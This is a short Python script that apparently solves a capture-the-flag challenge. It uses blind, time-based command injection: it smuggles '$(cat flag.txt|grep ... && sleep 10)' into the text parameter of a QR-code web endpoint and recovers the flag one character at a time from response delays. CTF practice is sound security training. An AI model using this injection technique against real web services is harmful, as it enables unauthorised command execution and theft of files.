import requests
import time
import string

#
alphabet = string.lowercase+string.uppercase+string.digits+"_{}!-^:;,|()/\"%$."#string.printable#
#alphabet = alphabet.replace("\"","").replace("\\","").replace("'","")

text = 'rtcp{fl4gz_1n_qr_c0d3s..._b1c3fe}'
while True:
    for j in alphabet:
        COMMAND = """$(cat flag.txt|grep '^"""+text+j+'\' %26%26 sleep 10)'
        print COMMAND
        start = time.time()
        res = requests.get("http://challs.houseplant.riceteacatpanda.wtf:30004/qr?text="+COMMAND)
        end = time.time()
        #print res.text
        print "time: " + str((end-start))
        if (end-start) > 10:
            text += j
            print "-"*50
            print text
            print "-"*50
            break
